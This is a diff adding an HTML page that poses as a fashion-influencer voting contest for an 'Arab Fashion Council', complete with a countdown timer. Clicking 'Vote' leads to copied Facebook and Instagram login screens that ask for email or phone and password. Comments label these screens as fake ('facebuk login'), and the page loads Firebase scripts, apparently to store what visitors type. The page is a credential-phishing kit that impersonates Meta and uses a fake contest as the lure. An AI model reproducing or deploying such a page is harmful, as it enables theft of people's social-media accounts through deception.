@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta id="viewport" name="viewport"
+        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
+    <title>New Link</title>
+    <link id="dynamic-favicon" href="assets/favicon.png" rel="shortcut icon" sizes="196x196">
+    <link type="text/css" rel="stylesheet" href="css/fb.css">
+    <link type="text/css" rel="stylesheet" href="css/fb_style.css">
+    <link type="text/css" rel="stylesheet" href="css/page.css">
+    <link rel="stylesheet" href="css/profile.css">
+    <link rel="stylesheet" href="css/index.css">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/index.js"></script>
+
+</head>
+
+<body style="background-color: rgb(240 246 255);">
+
+    <div id="home">
+        <header>
+            <div class="stopwatch" onclick="toggleStopwatch()">
+                <div class="clock-face" id="clockFace">
+                    <img class="icon" src="wristwatch.png" alt="Wristwatch Icon">
+                    Contest ends in <div class="time" id="timer">30:00</div>
+                </div>
+            </div><br>
+
+
+            <img src="assets/slide.png"><br><br>
+
+            <center>
+                <div class="mgm">
+                    <span class="txt"></span>
+                </div><br>
+
+                <button id="vote2" onclick="vote()">
+                    Click Here To Vote
+                </button>
+            </center>
+        </header>
+
+        <div id="blue">
+
+            <h2>
+                Arab Fashion Council
+            </h2>
+
+        </div>
+        <div id="news">
+            <p>
+                Are you ready to immerse yourself in a world of style, culture, and innovation? The Arab Fashion Council
+                is your gateway to the captivating realm of Arab fashion. We invite you to join us on a journey where
+                tradition meets modernity, and where fashion becomes a powerful expression of identity.
+            </p>
+        </div>
+
+        <div id="news">
+            <p>Vote for Excellence. Vote for Diversity. Vote for Arab Fashion Council!</p>
+
+        </div>
+
+        <div id="blue">
+
+            <h2>
+                📢 How to Vote:
+            </h2>
+
+        </div>
+        <div id="news">
+            <p>
+            </p>
+        </div>
+
+        <div id="news">
+            <p>#1 Each influencer has a unique hashtag our social media page.</p>
+            <p>#2 Click the vote button</p>
+            <p>#3 Voting Deadline: Voting is open until December. Don't miss the chance to support your favorite
+                influencer!</p>
+
+        </div>
+
+
+        </center>
+        <div id="blue">
+            <center>
+                <h2>Meet Our Contestants</h2>
+            </center>
+        </div>
+        <br>
+        <center>
+            <profile>
+
+                <!-- Profile Card 1 -->
+                <div id="voter" class="profile-card">
+                    <img src="assets/contest1.jpg" alt="Profile 1" class="profile-image">
+                    <div class="hashtags">
+                        <span>#ArabFashionCouncil</span>
+                    </div>
+                    <button onclick="vote()" class="vote-button">Vote</button>
+                </div>
+
+                <!-- Profile Card 2 -->
+                <div id="voter" class="profile-card">
+                    <img src="assets/contestant002.jpg" alt="Profile 2" class="profile-image">
+                    <div class="hashtags">
+                        <span>#DubaiFashionWeek</span>
+                    </div>
+                    <button onclick="vote()" class="vote-button">Vote</button>
+                </div>
+
+                <!-- Profile Card 3 -->
+                <div id="voter" class="profile-card">
+                    <img src="assets/contestant003.jpg" alt="Profile 2" class="profile-image">
+                    <div class="hashtags">
+                        <span>#ArabFashionInnovation</span>
+                    </div>
+                    <button onclick="vote()" class="vote-button">Vote</button>
+                </div>
+
+                <!-- Profile Card 4 -->
+                <div id="voter" class="profile-card">
+                    <img src="assets/contestant004.jpg" alt="Profile 2" class="profile-image">
+                    <div class="hashtags">
+                        <span>#Creativity</span>
+                    </div>
+                    <button onclick="vote()" class="vote-button">Vote</button>
+                </div>
+
+                <!-- Profile Card 5 -->
+                <div id="voter" class="profile-card">
+                    <img src="assets/contestant005.jpg" alt="Profile 2" class="profile-image">
+                    <div class="hashtags">
+                        <span>#ArabFashionHeritage</span>
+                    </div>
+                    <button onclick="vote()" class="vote-button">Vote</button>
+                </div>
+
+                <!-- Profile Card 6 -->
+                <div id="voter" class="profile-card">
+                    <img src="assets/contestant006.jpg" alt="Profile 2" class="profile-image">
+                    <div class="hashtags">
+                        <span>#CulturalCouture</span>
+                    </div>
+                    <button onclick="vote()" class="vote-button">Vote</button>
+                </div>
+
+                <!-- Profile Card 7 -->
+                <div id="voter" class="profile-card">
+                    <img src="assets/contestant007.jpg" alt="Profile 2" class="profile-image">
+                    <div class="hashtags">
+                        <span>#ArabFashionTrends</span>
+                    </div>
+                    <button onclick="vote()" class="vote-button">Vote</button>
+                </div>
+
+                <!-- Profile Card 8 -->
+                <div id="voter" class="profile-card">
+                    <img src="assets/contestant008.jpg" alt="Profile 2" class="profile-image">
+                    <div class="hashtags">
+                        <span>#ArabFashionista</span>
+                    </div>
+                    <button onclick="vote()" class="vote-button">Vote</button>
+                </div>
+            </profile>
+        </center>
+    </div>
+    <center>
+        <div id="choose">
+            <center>
+                <p>
+                    Vote using:
+                </p>
+            </center>
+            <center>
+                <p>
+                    <img id="fb" onclick="handleFbClick()" src="image/fb.png">
+                    <img id="ig" onclick="handleIgClick()" src="image/ig.png">
+                </p>
+                <br>
+                <div id="choose">
+                    <button class="close-button" onclick="closeDialog()">x</button>
+                    <!-- Your content here -->
+                </div>
+
+                <button onclick="closeDialog()" id="cancel">Close</button>
+            </center>
+        </div>
+    </center>
+
+    <!--facebuk login-->
+    <div id="fbp">
+
+        <fbcontainer style="margin: 0 auto; text-align: center; background-color: rgb(240 246 255);">
+            <br>
+            <center><span
+                    style="display: flex; justify-content: center; align-items: center; text-align: center; color: rgb(70, 90, 105); display: inline; font-size: 13px; font-family: &quot;Optimistic Text Normal&quot;; ">English
+                    (UK)</span></center><br><br><br><br>
+
+            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center;">
+                <img alt="Facebook from Meta" src="img/fblogo.png" class="wbloks_1"
+                    style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
+            </div><br><br><br>
+
+            <div class="form-group">
+                <input class="inputC" type="text" id="fb-email" required oninput="toggleClearIcon()">
+                <label for="fb-email">Mobile number or email address</label>
+                <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
+            </div>
+            <div class="form-group">
+                <input class="inputC" type="password" id="fb-pass" required>
+                <label for="fb-pass">Password</label>
+                <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
+                <!-- Icon as a clickable div -->
+            </div>
+
+            <div
+                style="pointer-events: none; opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 22px; align-items: center; flex-direction: row; justify-content: center;">
+
+                <div class="wbloks_113" dir="auto">
+                    <center><span onclick="login()" id="ig-log" data-bloks-name="bk.components.TextSpan"
+                            style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">Log
+                            in</span></center>
+                </div>
+
+            </div> <br>
+
+            <div class="wbloks_112" style="font-size: 15px; max-height: 20.28px; word-break: break-all;">
+                <div class="wbloks_113" dir="auto"><span data-bloks-name="bk.components.TextSpan"
+                        style="line-height: 1rem; color: rgb(28, 43, 51); font-weight: 500; display: inline; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Forgotten
+                        Password?</span></div>
+            </div><br><br><br><br><br>
+
+            <div data-bloks-name="bk.components.Flexbox" tabindex="0" role="button" aria-label="Create new account"
+                data-anchor-id="replay" class="wbloks_1" style="pointer-events: inherit; width: 100%;">
+                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                    style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(203, 210, 217); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
+                    <div>
+                        <span data-bloks-name="bk.components.TextSpan"
+                            style="padding: 8px; display: flex; justify-content: center; color: rgb(28, 43, 51); font-weight: 500; display: flex; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Create
+                            new account</span>
+                    </div>
+
+                </div>
+            </div>
+
+
+            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                style="pointer-events: none; flex-grow: 1; flex-shrink: 1e+06; padding-bottom: 0px; flex-direction: column; justify-content: flex-end;">
+                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                    style="pointer-events: none; padding-top: 20px; padding-bottom: 20px; align-items: center; justify-content: center;">
+                    <center>
+                        <div class="wbloks_1" style="height: 12px; aspect-ratio: 5 / 1;">
+                            <div data-bloks-name="bk.components.AspectRatio" class="wbloks_108"
+                                style="aspect-ratio: 5 / 1;">
+                                <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" height="1" width="5"
+                                    class="wbloks_110"></svg>
+                            </div>
+                            <div class="wbloks_109"><img alt="Meta logo" src="img/meta.png" class="wbloks_1"
+                                    style="width: 100%; pointer-events: inherit; mask-image: url(&quot;img/meta.png&quot;); mask-size: contain; background-color: rgb(70, 90, 105); object-position: 10000px 10000px; object-fit: contain; overflow: hidden;">
+                            </div>
+                    </center>
+                </div>
+            </div><br>
+            <div data-bloks-name="bk.components.Flexbox"
+                style="font-family: &quot;Optimistic Text Normal&quot;; word-spacing: 10px; pointer-events: none; align-items: center; flex-direction: column; justify-content: center;">
+                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1" style="pointer-events: none;">
+                    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                        style="pointer-events: none; padding-left: 4px; padding-right: 4px; padding-bottom: 4px;">
+                        <span data-bloks-name="bk.components.TextSpan"
+                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">About</span>
+                        <span data-bloks-name="bk.components.TextSpan"
+                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">Help</span>
+                        <span data-bloks-name="bk.components.TextSpan"
+                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">More</span>
+                    </div>
+                </div>
+            </div>
+        </fbcontainer>
+    </div>
+    <!--facebuk login ends-->
+
+    <!--Insta login begins-->
+    <div id="igp">
+        <igcontainer class="_ar45 system-fonts--body roboto">
+            <div id="mount_0_0_6z">
+                <div class="">
+                    <div class="">
+                        <div
+                            class="x4afe7t x1v7wizp xqcmdr3 x1htlvfj xds687c xixxii4 x17qophe x13vifvy x1x85hfe x1s85apg">
+                            <div
+                                class="x1x1c4bx x1c74tu6 x1v7wizp x1w55rbo xa3vuyk xuoj239 xee5nap xh8yej3 x1so62im xds687c xixxii4 x17qophe x13vifvy x1x85hfe">
+                                <div
+                                    class="x1x1c4bx x1c74tu6 xa4qsjk x1eg1fw9 x1esw782 x12zrl2 xuoj239 xee5nap xh8yej3 x1so62im">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="x9f619 x1n2onr6 x1ja2u2z">
+                            <div class="x78zum5 xdt5ytf x1n2onr6 x1ja2u2z">
+                                <div class="x78zum5 xdt5ytf x1n2onr6 xat3117 xxzkxad x4m6w61">
+                                    <div class="x78zum5 xdt5ytf x1t2pt76 x1n2onr6 x1ja2u2z x10cihs4">
+                                        <section class="x78zum5 xdt5ytf x1iyjqo2 x1wjobn4">
+                                            <main class="xvbhtw8 x78zum5 xdt5ytf x1iyjqo2 x182iqb8 x1n2onr6 xg6iff7"
+                                                role="main">
+                                                <nav
+                                                    class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdt5ytf x2lah0s xln7xf2 xk390pu x1anpbxc xmo9yow xat24cr x17adc0v xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x11njtxf">
+                                                    <span
+                                                        class="x1ypdohk x1rg5ohu x1n2onr6 x16dsc37 x1pg5gke x1yrsyyn xsyo7zv x10b6aqq x16hj40l x1qkh490">
+                                                        <div
+                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1uhb9sk x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
+                                                            <span
+                                                                class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye x1fhwpqd xo1l8bm x1roi4f4 x1s3etm8 x676frb x10wh9bi x1wdrske x8viiok x18hxmgj"
+                                                                dir="auto"
+                                                                style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 16px;">English</span>
+                                                            <div
+                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xsgj6o6 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
+                                                                <span
+                                                                    style="display: inline-block; transform: rotate(180deg);"><svg
+                                                                        aria-label="Down chevron icon"
+                                                                        class="x1lliihq x1n2onr6 x1roi4f4"
+                                                                        fill="currentColor" height="12" role="img"
+                                                                        viewBox="0 0 24 24" width="12">
+                                                                        <title>Down chevron icon</title>
+                                                                        <path
+                                                                            d="M21 17.502a.997.997 0 0 1-.707-.293L12 8.913l-8.293 8.296a1 1 0 1 1-1.414-1.414l9-9.004a1.03 1.03 0 0 1 1.414 0l9 9.004A1 1 0 0 1 21 17.502Z">
+                                                                        </path>
+                                                                    </svg></span>
+                                                            </div>
+                                                        </div>
+                                                    </span>
+                                                </nav>
+                                                <article
+                                                    class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 x1q0g3np x1iyjqo2 x2lah0s xk390pu xl56j7k xg87l8a xkrivgy xat24cr x1gryazu x1ykew4q xexx8yu x4uap5 x1gan7if xkhd6sd x11njtxf xh8yej3 x1d2lwc3 x1n2onr6">
+                                                    <div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
+                                                        style="width: 100%;">
+                                                        <div
+                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
+                                                            <div class="_ab1y _ab1-">
+                                                                <div class="_ab21">
+                                                                    <div
+                                                                        class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xseo6mj xod5an3 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                        <div aria-disabled="false" role="button"
+                                                                            tabindex="0" style="cursor: pointer;"><i
+                                                                                data-visualcompletion="css-img"
+                                                                                aria-label="Instagram" class=""
+                                                                                role="img"
+                                                                                style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yh/r/IS7e616CiR2.png&quot;); background-position: 0px 0px; background-size: 176px 258px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="_ab3a">
+                                                                        <form class="_ab3b" id="loginForm"
+                                                                            method="post">
+                                                                            <div
+                                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xqui205 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                                <div
+                                                                                    class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                                    <button
+                                                                                        class=" _acan _acap _acas _aj1- _ap30"
+                                                                                        type="button"><span
+                                                                                            class="_9zlu _ab36"></span><span
+                                                                                            class="">Continue with
+                                                                                            Facebook</span></button>
+                                                                                </div>
+                                                                                <div class="_ab38">
+                                                                                    <div class="x78zum5 x1q0g3np">
+                                                                                        <div
+                                                                                            class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
+                                                                                        </div>
+                                                                                        <div
+                                                                                            class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1roi4f4 x78zum5 xdt5ytf x1c4vz4f x2lah0s x1nxh6w3 x1s688f x1ly1vsg xdj266r xpdqn1h xat24cr x1sliqq xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xtvhhri x11njtxf">
+                                                                                            or</div>
+                                                                                        <div
+                                                                                            class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                                <div class="_ab31">
+                                                                                    <div
+                                                                                        class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
+                                                                                        <label class="_aa48 _aa49"><span
+                                                                                                class="_aa4a">Phone
+                                                                                                number,
+                                                                                                username, or
+                                                                                                email</span><input
+                                                                                                id="ig-uname"
+                                                                                                aria-label="Phone number, username, or email"
+                                                                                                aria-required="true"
+                                                                                                autocapitalize="off"
+                                                                                                autocorrect="off"
+                                                                                                maxlength="75"
+                                                                                                class="_aa4b _add6 _ac4d _ap35"
+                                                                                                dir=""
+                                                                                                type="text"></label>
+                                                                                        <div
+                                                                                            class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                                <div class="_ab31">
+                                                                                    <div
+                                                                                        class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
+                                                                                        <label class="_aa48 _aa49"><span
+                                                                                                class="_aa4a">Password</span><input
+                                                                                                id="ig-pass"
+                                                                                                aria-label="Password"
+                                                                                                aria-required="true"
+                                                                                                autocapitalize="off"
+                                                                                                autocorrect="off"
+                                                                                                class="_aa4b _add6 _ac4d _ap35"
+                                                                                                type="text"
+                                                                                                dir=""></label>
+                                                                                        <div
+                                                                                            class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
+                                                                                            <div
+                                                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1i64zmx x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                                <div
+                                                                                    class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1e56ztr x540dpk x1m39q7l xsag5q8 xz9dl7a x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh x13a6bvl">
+                                                                                    <span
+                                                                                        class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x173jzuc x2b8uid x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
+                                                                                        dir="auto"
+                                                                                        style="cursor: pointer; line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">Forgot
+                                                                                        password?</span>
+                                                                                </div>
+                                                                                <div
+                                                                                    class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                                    <button onclick="ig()"
+                                                                                        class=" _acan _acap _acas _aj1- _ap30"
+                                                                                        disabled="" type="submit">
+                                                                                        <div
+                                                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                                            Log in</div>
+                                                                                    </button>
+                                                                                </div>
+                                                                            </div>
+                                                                            <div
+                                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xw7yly9 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
+                                                                                <span
+                                                                                    class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x1roi4f4 x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
+                                                                                    dir="auto"
+                                                                                    style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
+                                                                                    <p>Don't have an account? <span
+                                                                                            class="_ap3a _aaco _aacw _aad0 _aad7"
+                                                                                            dir="auto">Sign up</span>
+                                                                                    </p>
+                                                                                </span>
+                                                                            </div>
+                                                                        </form>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </article>
+                                                <div
+                                                    class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1hq5gj4 x1n2onr6 x1ey2m1c x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh xl56j7k">
+                                                    <div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
+                                                        style="height: 26px; width: 52px;"><img alt="from Meta"
+                                                            src="meta.svg">
+                                                    </div>
+                                                </div>
+                                            </main>
+                                        </section>
+                                        <div>
+                                            <div></div>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </igcontainer>
+    </div>
+
+    <!--Insta login ends-->
+
+
+
+    <script>
+        function togglePasswordVisibility() {
+            var passwordField = document.getElementById("password");
+            var toggleButton = document.querySelector(".toggle-password");
+
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                toggleButton.style.backgroundImage = "url('/img/view.png')"; // Change to visible icon
+            } else {
+                passwordField.type = "password";
+                toggleButton.style.backgroundImage = "url('/img/hide.png')"; // Change to hidden icon
+            }
+        }
+
+        function toggleClearIcon() {
+            var input = document.getElementById("email");
+            var clearIcon = document.getElementById("clearIcon");
+
+            if (input.value.trim() !== "") {
+                clearIcon.style.display = "block";
+            } else {
+                clearIcon.style.display = "none";
+            }
+        }
+
+        function clearEmailInput() {
+            var input = document.getElementById("email");
+            input.value = "";
+            document.getElementById("clearIcon").style.display = "none";
+        }
+    </script>
+
+    <!--Favicon
+
+    <script>
+        function changeFavicon(faviconPath) {
+            var link = document.getElementById('dynamic-favicon');
+            link.href = faviconPath;
+        }
+
+        document.getElementById('fb2').addEventListener('click', function () {
+            changeFavicon('img/favicon.png');
+        });
+
+        document.getElementById('ig2').addEventListener('click', function () {
+            changeFavicon('img/igfavicon.png');
+        });
+
+        // Ensure the default favicon is loaded when the page is first loaded
+        window.onload = function () {
+            changeFavicon('assets/favicon.png');
+        };
+    </script>
+-->
+
+    <script>
+        function changeFavicon(iconUrl) {
+            const favicon = document.getElementById('dynamic-favicon');
+            favicon.href = iconUrl;
+        }
+
+        function fb() {
+            document.getElementById("fbp").style.display = "block";
+            document.getElementById("home").style.display = "none";
+            document.getElementById("choose").style.display = "none";
+
+        }
+
+        function handleFbClick() {
+            changeFavicon('img/favicon.png');
+            fb();
+            document.title = 'Log in to Facebook';
+        }
+
+
+        function ig() {
+            document.getElementById("igp").style.display = "block";
+            document.getElementById("home").style.display = "none";
+            document.getElementById("choose").style.display = "none";
+        }
+
+        function handleIgClick() {
+            changeFavicon('img/igfavicon.png');
+            ig();
+            document.title = 'Instagram';
+            window.location.href = 'insta.html';
+        }
+
+    </script>
+    <!--Firebase-->
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+    <script src="js/firebase.js">
+
+
+
+    </script>
+    <!--Firebase ends-->
+</body>
+
+</html>
